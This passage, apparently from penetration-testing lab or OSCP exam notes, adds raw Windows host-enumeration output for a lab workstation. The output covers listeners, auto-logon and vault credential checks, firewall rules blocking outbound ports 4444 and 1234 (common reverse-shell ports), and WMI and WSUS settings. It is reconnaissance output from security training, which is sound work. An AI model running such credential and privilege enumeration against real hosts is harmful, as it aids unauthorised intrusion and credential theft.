+  172.16.104.206:1900    3204   SSDPSRV                 svchost.exe
+  172.16.104.206:51547   3204   SSDPSRV                 svchost.exe
+  192.168.104.206:137    4                              System
+  192.168.104.206:138    4                              System
+  192.168.104.206:1900   3204   SSDPSRV                 svchost.exe
+  192.168.104.206:51546  3204   SSDPSRV                 svchost.exe
+====== UserRightAssignments ======
+
+Must be an administrator to enumerate User Right Assignments
+====== WifiProfile ======
+
+ERROR: WlanOpenHandle() failed: 1062
+====== WindowsAutoLogon ======
+
+  DefaultDomainName              : 
+  DefaultUserName                : 
+  DefaultPassword                : 
+  AltDefaultDomainName           : 
+  AltDefaultUserName             : 
+  AltDefaultPassword             : 
+
+====== WindowsCredentialFiles ======
+
+====== WindowsDefender ======
+
+Locally-defined Settings:
+
+
+
+GPO-defined Settings:
+====== WindowsEventForwarding ======
+
+====== WindowsFirewall ======
+
+Collecting Windows Firewall Non-standard Rules
+
+
+Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall
+
+Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy
+
+Domain Profile
+    Enabled                  : True
+    DisableNotifications     : False
+    DefaultInboundAction     : ALLOW
+    DefaultOutboundAction    : ALLOW
+
+Public Profile
+    Enabled                  : True
+    DisableNotifications     : False
+    DefaultInboundAction     : ALLOW
+    DefaultOutboundAction    : ALLOW
+
+Standard Profile
+    Enabled                  : True
+    DisableNotifications     : False
+    DefaultInboundAction     : ALLOW
+    DefaultOutboundAction    : ALLOW
+
+Rules:
+
+  Name                 : Block Outbound 4444
+  Description          : 
+  ApplicationName      : 
+  Protocol             : TCP
+  Action               : Block
+  Direction            : Out
+  Profiles             : 
+  Local Addr:Port      : :
+  Remote Addr:Port     : :4444
+
+  Name                 : Block Outbound 1234
+  Description          : 
+  ApplicationName      : 
+  Protocol             : TCP
+  Action               : Block
+  Direction            : Out
+  Profiles             : 
+  Local Addr:Port      : :
+  Remote Addr:Port     : :1234
+
+====== WindowsVault ======
+
+
+  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+  Vault Type     : Web Credentials
+  Item count     : 0
+
+  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
+  Vault Type     : Windows Credentials
+  Item count     : 0
+====== WMI ======
+
+  AdminPasswordStatus           : 1
+  AutomaticManagedPagefile      : True
+  AutomaticResetBootOption      : True
+  AutomaticResetCapability      : True
+  BootOptionOnLimit             : 3
+  BootOptionOnWatchDog          : 3
+  BootROMSupported              : True
+  BootStatus(UInt16[])          : 0,0,0,33,31,162,0,3,2,2
+  BootupState                   : Normal boot
+  Caption                       : WS26
+  ChassisBootupState            : 3
+  CreationClassName             : Win32_ComputerSystem
+  CurrentTimeZone               : -480
+  DaylightInEffect              : False
+  Description                   : AT/AT COMPATIBLE
+  DNSHostName                   : WS26
+  Domain                        : oscp.exam
+  DomainRole                    : 1
+  EnableDaylightSavingsTime     : True
+  FrontPanelResetStatus         : 3
+  HypervisorPresent             : True
+  InfraredSupported             : False
+  KeyboardPasswordStatus        : 3
+  Manufacturer                  : VMware, Inc.
+  Model                         : VMware7,1
+  Name                          : WS26
+  NetworkServerModeEnabled      : True
+  NumberOfLogicalProcessors     : 2
+  NumberOfProcessors            : 1
+  OEMStringArray(String[])      :
+      [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
+      Welcome to the Virtual Machine
+  PartOfDomain                  : True
+  PauseAfterReset               : 3932100000
+  PCSystemType                  : 1
+  PCSystemTypeEx                : 1
+  PowerOnPasswordStatus         : 0
+  PowerState                    : 0
+  PowerSupplyState              : 3
+  PrimaryOwnerName              : Windows User
+  ResetCapability               : 1
+  ResetCount                    : -1
+  ResetLimit                    : -1
+  Roles(String[])               :
+      LM_Workstation
+      LM_Server
+      NT
+  Status                        : OK
+  SystemType                    : x64-based PC
+  ThermalState                  : 3
+  TotalPhysicalMemory           : 6441422848
+  WakeUpType                    : 6
+
+====== WMIEventConsumer ======
+
+  Name                              :   SCM Event Log Consumer
+  ConsumerType                      :   S-1-5-32-544
+  CreatorSID                        :   NTEventLogEventConsumer
+  Category                          :   0
+  EventID                           :   0
+  EventType                         :   1
+  InsertionStringTemplates          :   System.String[]
+  MachineName                       :   
+  MaximumQueueSize                  :   
+  Name                              :   SCM Event Log Consumer
+  NameOfRawDataProperty             :   
+  NameOfUserSIDProperty             :   sid
+  NumberOfInsertionStrings          :   0
+  SourceName                        :   Service Control Manager
+  UNCServerName                     :   
+====== WMIEventFilter ======
+
+  Name                           : SCM Event Log Filter
+  Namespace                      : ROOT\Subscription
+  EventNamespace                 : root\cimv2
+  Query                          : select * from MSFT_SCMEventLogEvent
+  QueryLanguage                  : WQL
+  EventAccess                    : 
+  CreatorSid                     : S-1-5-32-544
+
+====== WMIFilterBinding ======
+
+  Consumer                       : __EventFilter.Name="SCM Event Log Filter"
+  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
+  CreatorSID                     : S-1-5-32-544
+
+====== WSUS ======
+
+  UseWUServer                    : False
+  Server                         : 
+  AlternateServer                : 
+  StatisticsServer               : 
+
+
+
+[*] Completed collection in 1127.046 seconds
 ```
 
 
